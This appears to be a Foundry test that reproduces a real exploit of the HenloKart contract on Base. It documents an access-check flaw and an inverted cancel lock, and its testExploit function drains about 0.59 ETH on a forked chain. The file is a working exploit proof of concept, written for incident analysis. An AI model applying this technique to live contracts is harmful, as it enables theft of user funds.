// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";

// @KeyInfo - Total Lost : 0.59 ETH
// Attacker : 0xc2b2197ca4b2ee3b4eb61fc59e6d592d04a2e26a
// Attack Contract : 0xbb7cef7b870bdb80cdd2857785ad7e84303b5625
// Vulnerable Contract : 0x27fafc210e4b240786d9ef3aa44399fb7e107f6f
// Attack Tx : https://basescan.org/tx/0xf9ccb244be71ce3ff8c61021dc43a51c21bd1e11d73e61e64d05a9218f832c7e
//
// @Info
// Vulnerable Contract Code : https://basescan.org/address/0x27fafc210e4b240786d9ef3aa44399fb7e107f6f#code
//
// @Analysis
// Twitter Guy : https://t.me/defimon_alerts/518
//
// HenloKart's ETH transfer helper treated `from == msg.sender` as permission to
// send ETH from the HenloKart contract balance, instead of requiring msg.value.
// A zero-value native-token race commitment could therefore be funded from the
// victim balance. The old cancel lock check was also inverted, allowing the
// attacker to cancel immediately and receive the fake deposit back.

address constant ATTACKER = 0xc2B2197ca4B2eE3b4EB61Fc59E6D592d04a2e26A;
address constant ATTACK_CONTRACT = 0xBB7cef7b870BdB80CdD2857785AD7E84303B5625;
address constant HENLO_KART = 0x27faFC210e4B240786d9EF3Aa44399Fb7E107F6f;
address constant HISTORICAL_AGENT = 0xddb9FcCd82C4f5fAB67140EFfd8a744E5b3b101a;
address constant HISTORICAL_IMPLEMENTATION = 0x5E30de98d133f956E118233ed8E054e0f5e65781;

interface IHenloKartV1 {
    function commitToRace(
        address player,
        address agent,
        address betToken,
        uint256 tokenId,
        uint256 betSize,
        uint64 deadline,
        uint64 count
    ) external payable returns (bytes32 commitmentHash);

    function cancelCommitment(
        bytes32 commitmentHash
    ) external;
}

contract ContractTest is BaseTestWithBalanceLog {
    IHenloKartV1 private constant henloKart = IHenloKartV1(HENLO_KART);

    function setUp() public {
        uint256 forkBlock = 26_884_275;
        vm.createSelectFork("base", forkBlock);

        fundingToken = address(0);
        vm.label(ATTACKER, "Attacker");
        vm.label(ATTACK_CONTRACT, "Historical attack contract");
        vm.label(HENLO_KART, "HenloKart");
        vm.label(HISTORICAL_AGENT, "Historical hamster agent");
        vm.label(HISTORICAL_IMPLEMENTATION, "HenloKart vulnerable implementation");
    }

    function testExploit() public balanceLog {
        uint256 balanceBefore = address(this).balance;

        bytes32 commitmentHash = henloKart.commitToRace(
            address(this),
            HISTORICAL_AGENT,
            address(0),
            0,
            0.01 ether,
            0,
            59
        );
        henloKart.cancelCommitment(commitmentHash);

        assertGt(address(this).balance - balanceBefore, 0.58 ether);
    }

    receive() external payable {}
}
